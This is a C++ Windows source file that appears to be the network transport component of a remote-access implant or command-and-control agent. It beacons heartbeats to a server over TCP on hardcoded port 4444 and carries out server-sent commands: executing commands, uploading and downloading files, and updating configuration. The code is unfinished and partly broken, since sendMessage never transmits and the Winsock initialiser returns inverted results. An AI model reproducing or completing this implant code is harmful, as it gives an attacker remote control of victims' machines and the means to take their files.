#include "Transporter.h"
#include "MessageTypes.h"
#include "MessageHandler.h"

#include <winsock2.h>
#include <ws2tcpip.h>

#include <iostream>
#pragma comment(lib, "ws2_32.lib")

inline bool Transporter::sendMessage(const InternalMessage& msg)
{
    //auto serialized = serializer_.serialize(msg);
    //auto encoded = encoder_.encode(serialized);
    //auto encrypted = encryptor_.encrypt(encoded);
    //return send(encrypted);
	return serializer_.serialize(msg);
}

InternalMessage Transporter::receiveMessage()
{
    auto data = receive();
    if (data.empty()) 
	{
		return InternalMessage();
	}

    //auto decrypted = encryptor_.decrypt(data);
    //auto decoded = encoder_.decode(decrypted);
    //return serializer_.deserialize(decoded);
    return serializer_.deserialize(data);
}

void Transporter::beacon()
{
    auto heartbeat = createHeartbeat();
    sendMessage(heartbeat);

    auto incoming = receiveMessage();
    if (incoming.header.messageType != DEFAULT)
    {
        handleIncomingMessage(incoming); // TODO: move this logic/function into MessageHandler? also, should this function return the result of a command so we have something to send back to the server??
    }
}

InternalMessage Transporter::createHeartbeat()
{
    InternalMessage msg;
    msg.header.messageType = MessageType::HEARTBEAT;
    msg.header.messageId = generateId();
    msg.header.dataSize = 0;
    return msg;
}

// TODO: move this logic/function into MessageHandler?
void Transporter::handleIncomingMessage(InternalMessage& msg)
{
    switch (msg.header.messageType)
    {
    case MessageType::EXECUTE_COMMAND:
        messageHandler_->executeCommand(msg.data);
        //messageHandler_->executeCommand(msg.data, msg.header.messageId);
        break;

    case UPLOAD_FILE:
        messageHandler_->uploadFile(msg.data);
        break;

    case DOWNLOAD_FILE:
        messageHandler_->downloadFile(msg.data);
        //messageHandler_->downloadFile(parseFilename(msg.data), msg.header.messageId);
        break;

    case CONFIG_UPDATE:
        messageHandler_->updateConfig(msg.data);
        break;

    case ERROR_REPORT:
        // Server sent an error, handle it
        messageHandler_->handleServerError(msg.data);
        break;
    default:
        std::cout << "default case, MessageType = " << msg.header.messageType << std::endl;
    }
}

uint32_t Transporter::generateId()
{
    return rand();
}




TCPTransporter::TCPTransporter(MessageHandler* hdlr, const std::string& server, uint16_t port)
//TCPTransporter::TCPTransporter(MessageHandler* hdlr, const std::string& server, std::string port)
    : Transporter(hdlr), server_(server), port_(port)
{
    initializeWinsock();
}

bool TCPTransporter::initializeWinsock()
{
    // TODO: check if winsock is already initialized somehow?
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        // printf("WSAStartup failed\n");
        return true;
    }
    return false;
    //winsock_initialized = true;
    
}

bool TCPTransporter::send(const std::vector<uint8_t>& data)
{
    if (!connected_ && !connect()) return false;
    
    return ::send(socket_, (const char*)data.data(), data.size(), 0) > 0;

}

bool TCPTransporter::connect()
{
    std::cout << "inside connect" << std::endl;
    socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (socket_ == INVALID_SOCKET)
    {
        std::cout << "socket invalid" << std::endl;
        return false;
    }
    


    ADDRINFOA hints, *result = nullptr;
    ZeroMemory(&hints, sizeof(hints));
    // TODO: do this instead of ZeroMemory
    //ADDRINFOA hints = { 0 };
    //ADDRINFOA* result = nullptr;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    //if (getaddrinfo(server_.c_str(), (std::to_string(port_)).c_str(), &hints, &result) != 0)
    if (getaddrinfo(server_.c_str(), "4444", &hints, &result) != 0) // TODO: use port_ instead of hardcode
    {
        //std::cout << "getaddrinfo failed" << std::endl;
        printf("getaddrinfo failed\n");
        return false;
    }
    /*
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);
    inet_pton(AF_INET, server_.c_str(), &addr.sin_addr);*/

    ADDRINFOA* ptr = result; // TODO: no need to assign result to ptr just use result?
    while (ptr != NULL)
    {
        if (::connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
        {
            std::cout << "connected == true" << std::endl;
            connected_ = true;
            break;
        }
        ptr = ptr->ai_next;
    }

    if (connected_ == false)
    {
        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
        std::cout << "connected_ == false" << std::endl;
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
        return false;
    }

    return true;
}

std::vector<uint8_t> TCPTransporter::receive()
{
    if (!connected_) return {};

    std::vector<uint8_t> buffer(4096);
    int received = recv(socket_, (char*)buffer.data(), buffer.size(), 0);
    if (received <= 0)
    {
        connected_ = false;
        return {};
    }
    buffer.resize(received);
    return buffer;
}


